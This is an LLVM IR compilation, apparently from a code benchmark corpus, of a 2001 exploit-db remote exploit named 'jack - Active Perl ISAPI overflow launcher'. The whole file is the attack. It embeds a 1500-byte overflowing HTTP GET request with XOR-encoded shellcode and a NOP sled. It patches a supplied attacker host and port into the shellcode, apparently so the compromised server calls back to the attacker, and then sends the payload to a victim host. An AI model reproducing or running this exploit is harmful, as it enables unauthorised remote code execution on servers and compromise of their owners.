; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21152.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21152.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.in_addr, i32, i8* }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.shellcode = private unnamed_addr constant [1500 x i8] c"GET /cgi-bin/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\8B\94\F8wBBBB\EB\03]\EB\05\E8\F8\FF\FF\FF\83\C5\15\90\90\90\8B\C53\C9f\B9\D7\02P\800\95@\E2\FA-\95\95d\E2\14\AD\D8\CF\05\95\E1\96\DD~`}\95\95\95\95\C8\1E@\14\7F\9Akjj\1EM\1E\E6\A9\96f\1E\E3\ED\96f\1E\EB\B5\96n\1E\DB\81\A6x\C3\C2\C4\1E\AA\96n\1Eg,\9B\95\95\95f3\E1\9D\CC\CA\16R\91\D0wr\CC\CA\CB\1EX\1E\D3\B1\96VDt\96T\A6\\\F3\1E\9D\1E\D3\89\96VTt\97\96T\1E\95\96V\1Eg\1Ek\1EE,\9E\95\95\95}\E1\94\95\95\A6U9\10U\E0l\C7\C3j\C2A\CF\1EM,\93\95\95\95}\CE\94\95\95R\D2\F1\99\95\95\95R\D2\FD\95\95\95\95R\D2\F9\94\95\95\95\FF\95\18\D2\F1\C5\18\D2\85\C5\18\D2\81\C5j\C2U\FF\95\18\D2\F1\C5\18\D2\8D\C5\18\D2\89\C5j\C2UR\D2\B5\D1\95\95\95\18\D2\B5\C5j\C2Q\1E\D2\85\1C\D2\C9\1C\D2\F5\1E\D2\89\1C\D2\CD\14\DA\D9\94\94\95\95\F3R\D2\C5\95\95\18\D2\E5\C5\18\D2\B5\C5\A6U\C5\C5\C5\FF\94\C5\C5}\95\95\95\95\C8\14x\D5kjj\C0\C5j\C2]j\E2\85j\C2qj\E2\89j\C2q\FD\95\91\95\95\FF\D5j\C2E\1E}\C5\FD\94\94\95\95j\C2}\10U\9A\10>\95\95\95\A6U\C5\D5\C5\D5\C5j\C2y\16mj\9A\11\02\95\95\95\1EM\F3R\92\97\95\F3R\D2\97\8E\ACR\D2\91U=\97\94\FF\85\18\92\C5\C6j\C2a\FF\A7j\C2I\A6\\\C4\C3\C4\C4\C4j\E2\81j\C2Y\10U\E1\F5\05\05\05\05\15\AB\95\E1\BA\05\05\05\05\FF\95\C3\FD\95\91\95\95\C0j\E2\81j\C2M\10U\E1\D5\05\05\05\05\FF\95j\A3\C0\C6j\C2m\16mj\E1\BB\05\05\05\05~'\FF\95\FD\95\91\95\95\C0\C6j\C2i\10U\E9\8D\05\05\05\05\E1\09\FF\95\C3\C5\C0j\E2\8Dj\C2A\FF\A7j\C2I~\1F\C6j\C2e\FF\95j\C2u\A6U9\10U\E0l\C4\C7\C3\C6jG\CF\CC>w{V\D2\F0\E1\C5\E7\FA\F6\D4\F1\F1\E7\F0\E6\E6\95\D9\FA\F4\F1\D9\FC\F7\E7\F4\E7\EC\D4\95\D6\E7\F0\F4\E1\F0\C5\FC\E5\F0\95\D2\F0\E1\C6\E1\F4\E7\E1\E0\E5\DC\FB\F3\FA\D4\95\D6\E7\F0\F4\E1\F0\C5\E7\FA\F6\F0\E6\E6\D4\95\C5\F0\F0\FE\DB\F4\F8\F0\F1\C5\FC\E5\F0\95\D2\F9\FA\F7\F4\F9\D4\F9\F9\FA\F6\95\C2\E7\FC\E1\F0\D3\FC\F9\F0\95\C7\F0\F4\F1\D3\FC\F9\F0\95\C6\F9\F0\F0\E5\95\D0\ED\FC\E1\C5\E7\FA\F6\F0\E6\E6\95\D6\F9\FA\E6\F0\DD\F4\FB\F1\F9\F0\95\C2\C6\DA\D6\DE\A6\A7\95\C2\C6\D4\C6\E1\F4\E7\E1\E0\E5\95\E6\FA\F6\FE\F0\E1\95\F6\F9\FA\E6\F0\E6\FA\F6\FE\F0\E1\95\F6\FA\FB\FB\F0\F6\E1\95\E6\F0\FB\F1\95\E7\F0\F6\E3\95\F6\F8\F1\BB\F0\ED\F0\95\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\903\C0\B0\90\03\D8\8B\03\8B@`3\DB\B3$\03\C3\FF\E0\EB\B9\90\90\051\8Cj.pl HTTP/1.0\0D\0A\0D\0A\00\00", align 16
@.str = private unnamed_addr constant [81 x i8] c"\0Ajack - Active Perl ISAPI overflow launcher\0Aby Indigo <indig0@talk21.com> 2001\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [71 x i8] c"Usage: %s <victim host> <victim port> <attacker host> <attacker port>\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"\0ASending exploit....\0A\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"Exploit sent.\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1500 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i16, align 2
  %9 = alloca i64, align 8
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca %struct.sockaddr_in, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = bitcast [1500 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([1500 x i8], [1500 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 1500, i1 false)
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp ne i32 %14, 5
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.1, i64 0, i64 0), i8* %19)
  %21 = call i32 @exit(i32 1) #4
  unreachable

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call %struct.hostent* @gethostbyname(i8* %25)
  store %struct.hostent* %26, %struct.hostent** %10, align 8
  %27 = icmp eq %struct.hostent* %26, null
  br i1 %27, label %28, label %34

28:                                               ; preds = %22
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @herror(i8* %31)
  %33 = call i32 @exit(i32 1) #4
  unreachable

34:                                               ; preds = %22
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @atoi(i8* %37)
  %39 = call i8* @htons(i32 %38)
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i8* %39, i8** %40, align 8
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 4
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @atoi(i8* %43)
  %45 = call i8* @htons(i32 %44)
  %46 = ptrtoint i8* %45 to i16
  store i16 %46, i16* %8, align 2
  %47 = load i16, i16* %8, align 2
  %48 = zext i16 %47 to i32
  %49 = xor i32 %48, 38293
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %8, align 2
  %51 = load i32, i32* @AF_INET, align 4
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i32 %51, i32* %52, align 4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %54 = load %struct.hostent*, %struct.hostent** %10, align 8
  %55 = getelementptr inbounds %struct.hostent, %struct.hostent* %54, i32 0, i32 0
  %56 = load i64, i64* %55, align 8
  %57 = inttoptr i64 %56 to %struct.in_addr*
  %58 = bitcast %struct.in_addr* %53 to i8*
  %59 = bitcast %struct.in_addr* %57 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %58, i8* align 4 %59, i64 4, i1 false)
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 3
  %62 = load i8*, i8** %61, align 8
  %63 = call %struct.hostent* @gethostbyname(i8* %62)
  store %struct.hostent* %63, %struct.hostent** %10, align 8
  %64 = icmp eq %struct.hostent* %63, null
  br i1 %64, label %65, label %71

65:                                               ; preds = %34
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 3
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @herror(i8* %68)
  %70 = call i32 @exit(i32 1) #4
  unreachable

71:                                               ; preds = %34
  %72 = load %struct.hostent*, %struct.hostent** %10, align 8
  %73 = getelementptr inbounds %struct.hostent, %struct.hostent* %72, i32 0, i32 0
  %74 = load i64, i64* %73, align 8
  %75 = inttoptr i64 %74 to i64*
  %76 = load i64, i64* %75, align 8
  store i64 %76, i64* %9, align 8
  %77 = load i64, i64* %9, align 8
  %78 = xor i64 %77, 2509608341
  store i64 %78, i64* %9, align 8
  %79 = load i16, i16* %8, align 2
  %80 = zext i16 %79 to i32
  %81 = and i32 %80, 255
  %82 = trunc i32 %81 to i8
  %83 = getelementptr inbounds [1500 x i8], [1500 x i8]* %6, i64 0, i64 745
  store i8 %82, i8* %83, align 1
  %84 = load i16, i16* %8, align 2
  %85 = zext i16 %84 to i32
  %86 = ashr i32 %85, 8
  %87 = and i32 %86, 255
  %88 = trunc i32 %87 to i8
  %89 = getelementptr inbounds [1500 x i8], [1500 x i8]* %6, i64 0, i64 746
  store i8 %88, i8* %89, align 2
  %90 = load i64, i64* %9, align 8
  %91 = and i64 %90, 255
  %92 = trunc i64 %91 to i8
  %93 = getelementptr inbounds [1500 x i8], [1500 x i8]* %6, i64 0, i64 750
  store i8 %92, i8* %93, align 2
  %94 = load i64, i64* %9, align 8
  %95 = lshr i64 %94, 8
  %96 = and i64 %95, 255
  %97 = trunc i64 %96 to i8
  %98 = getelementptr inbounds [1500 x i8], [1500 x i8]* %6, i64 0, i64 751
  store i8 %97, i8* %98, align 1
  %99 = load i64, i64* %9, align 8
  %100 = lshr i64 %99, 16
  %101 = and i64 %100, 255
  %102 = trunc i64 %101 to i8
  %103 = getelementptr inbounds [1500 x i8], [1500 x i8]* %6, i64 0, i64 752
  store i8 %102, i8* %103, align 16
  %104 = load i64, i64* %9, align 8
  %105 = lshr i64 %104, 24
  %106 = and i64 %105, 255
  %107 = trunc i64 %106 to i8
  %108 = getelementptr inbounds [1500 x i8], [1500 x i8]* %6, i64 0, i64 753
  store i8 %107, i8* %108, align 1
  %109 = load i32, i32* @AF_INET, align 4
  %110 = load i32, i32* @SOCK_STREAM, align 4
  %111 = call i32 @socket(i32 %109, i32 %110, i32 0)
  store i32 %111, i32* %7, align 4
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %116

113:                                              ; preds = %71
  %114 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %115 = call i32 @exit(i32 1) #4
  unreachable

116:                                              ; preds = %71
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %118 = load i32, i32* %7, align 4
  %119 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %120 = call i32 @connect(i32 %118, %struct.sockaddr* %119, i32 16)
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %125

122:                                              ; preds = %116
  %123 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %124 = call i32 @exit(i32 1) #4
  unreachable

125:                                              ; preds = %116
  %126 = load i32, i32* %7, align 4
  %127 = getelementptr inbounds [1500 x i8], [1500 x i8]* %6, i64 0, i64 0
  %128 = getelementptr inbounds [1500 x i8], [1500 x i8]* %6, i64 0, i64 0
  %129 = call i32 @strlen(i8* %128)
  %130 = call i32 @write(i32 %126, i8* %127, i32 %129)
  %131 = call i32 @sleep(i32 1)
  %132 = load i32, i32* %7, align 4
  %133 = call i32 @close(i32 %132)
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  %135 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @herror(i8*) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
